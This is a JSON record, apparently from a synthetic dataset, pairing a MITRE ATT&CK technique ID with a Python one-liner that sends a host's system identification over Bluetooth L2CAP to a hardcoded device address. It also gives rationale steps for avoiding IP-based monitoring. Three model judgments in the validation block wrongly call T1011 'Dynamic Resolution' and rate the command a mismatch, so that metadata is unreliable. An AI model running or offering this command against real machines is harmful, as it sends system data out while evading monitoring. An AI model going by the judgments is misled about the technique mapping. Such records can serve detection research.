{
  "technique_id": "T1011",
  "platform": "Linux",
  "shell": "Python",
  "command": "python3 -c \"import socket,platform; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP); s.settimeout(6); s.connect(('5C:F3:70:12:34:56', 0x1003)); s.sendall(('sys='+str(platform.uname())+'\\n').encode()); s.close()\"",
  "explanation": "Sends host identification over Bluetooth L2CAP PSM 0x1003, bypassing IP-centric monitoring systems per T1011.",
  "rationale_steps": [
    "Pick L2CAP to avoid the main IP-based monitoring plane.",
    "Use a less-common PSM (0x1003) to reduce service collisions.",
    "Serialize minimal system info and send over L2CAP.",
    "Close cleanly to prevent lingering connections."
  ],
  "obfuscation_level": "none",
  "id": "SYN-PYTHON-T1011-2e02ce6e-d365518a",
  "source_prompt_hash": "2e02ce6e",
  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The Python one-liner is perfectly well-formed with balanced parentheses, proper string formatting, correct socket module usage, and valid syntax for creating and using a Bluetooth socket.",
        "semantic_score": 2,
        "semantic_justification": "While the command is syntactically correct, it doesn't align with T1011 (Dynamic Resolution) as it uses a hardcoded Bluetooth MAC address rather than algorithmically determining network endpoints, and Bluetooth L2CAP is not typically associated with DGA or dynamic DNS techniques.",
        "combined_score": 3.5,
        "confidence": 0.9,
        "timestamp": "2025-10-02T06:13:01.555326Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The Python command is perfectly well-formed, with balanced quotes and parentheses, and uses valid syntax for establishing a Bluetooth L2CAP socket connection.",
        "semantic_score": 1,
        "semantic_justification": "The command hardcodes the Bluetooth MAC address, which directly contradicts the T1011 technique's focus on 'dynamic resolution' via algorithmic determination of endpoints (e.g., DGAs, fast-flux, dynamic DNS), rather than simply using an alternative communication channel.",
        "combined_score": 3.0,
        "confidence": 1,
        "timestamp": "2025-10-02T06:13:08.080113Z"
      },
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "The Python one-liner is well-formed with balanced quotes/parentheses, valid socket constants, and proper statement separators.",
        "semantic_score": 1,
        "semantic_justification": "It sends data to a fixed Bluetooth MAC/PSM and does not perform any dynamic endpoint selection (e.g., DNS/DGA-based rotation) as required by the Dynamic Resolution technique.",
        "combined_score": 3.0,
        "confidence": 0.9,
        "timestamp": "2025-10-02T06:13:32.860950Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 1.333,
    "llm_average_score": 3.167,
    "llm_verdict": "likely_mismatch",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}